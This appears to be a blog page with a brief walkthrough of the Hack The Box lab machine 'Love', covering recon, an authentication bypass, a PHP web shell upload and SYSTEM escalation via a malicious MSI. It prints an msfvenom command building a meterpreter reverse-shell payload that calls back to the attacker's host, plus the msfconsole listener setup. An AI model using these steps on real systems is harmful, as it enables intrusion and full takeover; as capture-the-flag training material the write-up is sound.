<html>
<head>
	<title> - TLDR - HTB: Love</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="/CSS/blog.css">
	<link rel="stylesheet" href="/CSS/global.css">
</head>
<body class="noselect">
	<h1 id="title" class="blog_title">
		<a href="/index.html" class="homelink">
			HTB: Love<br><a href="/Blogs/TLDR/index.html"><span id="tldr">- TLDR -</span></a>
		</a>
	</h1>
	<div id="big_wrapper" class="wordwrap">
		<div class="paragraph">
			<div id="menu">
				<a href="/index.html" class="menu_item">Home</a>
				<a href="/Blogs/HTB_Love/htb_love.html" class="menu_item">FULL</a>
				<a href="/Blogs/TLDR/index.html" class="menu_item">All TLDRs</a>
				<hr>
			</div>
		</div>
		<div class="paragraph">
			<p class="subtitle">Recon:</p>
			<p class="content"><span class="code">nmap -sT -sV -v &ltlove ip&gt</span> leads to the website.</p>
			<p class="content"><span class="code">gobuster dir -u &ltlove ip&gt -w &lt/path/to/wordlist&gt</span> leads us to "&ltlove ip&gt/admin/".</p>
		</div>
		<div class="paragraph">
			<p class="subtitle">Exploit Login & Getting Web Shell:</p>
			<p class="content">Using the exploit from <a href="https://www.exploit-db.com/exploits/49843" class="link">Exploit DB <b>[EXTERNAL]</b></a>, we can bypass the authentication.</p>
			<p class="content">Once "logged in", we click on the "voters" tab on the left menu. Click the blue "+" button to add a new user, and upload a php web shell as the user's image. Go to <span class="code">&ltlove ip&gt/images/&ltname of shell&gt.php</span> to access the shell.</p>
		</div>
		<div class="paragraph">
			<p class="subtitle">Getting User:</p>
			<p class="content">Get a reverse shell running (I used a <a href="/Blogs/resources#rshell_ref1" class="link">PowerShell one-liner</a>) then print the contents of the user file: <span class="code">type C:\Users\Phoebe\Desktop\user.txt</span>.</p>
		</div>
		<div class="paragraph">
			<p class="subtitle">Getting Admin:</p>
			<p class="content">Using some enumeration tool, we discover the box is able to "install" msi scripts as NT AUTHORITY/SYSTEM. Create a reverse shell: <span class="code">msfvenom -p windows/meterpreter/reverse_tcp -f msi lhost=&ltyour ip&gt lport=3188 > hack.msi</span>, then upload it however you like. The easiest is to simply "edit" our voters image by clicking the pencil icon beside our voters name. Start a meterpreter session: <span class="code">msfconsole; use exploit/multi/handler; set LHOST=&ltyour ip&gt; set LPORT=3188; set PAYLOAD=windows/meterpreter/reverse_tcp; exploit</span>. Upload the malicious msi then execute it through our current user session.</p>
			<p class="content">Once the conenction is complete, run <span class="code">shell; powershell</span> to get a powershell session, then print the root.txt file: <span class="code">type C:\Users\Administrator\Desktop\root.txt</span>
		</div>
	</div>
</body>
<footer>
	<script type="text/javascript" src="/JS/blog.js"></script>
</footer>
</html>
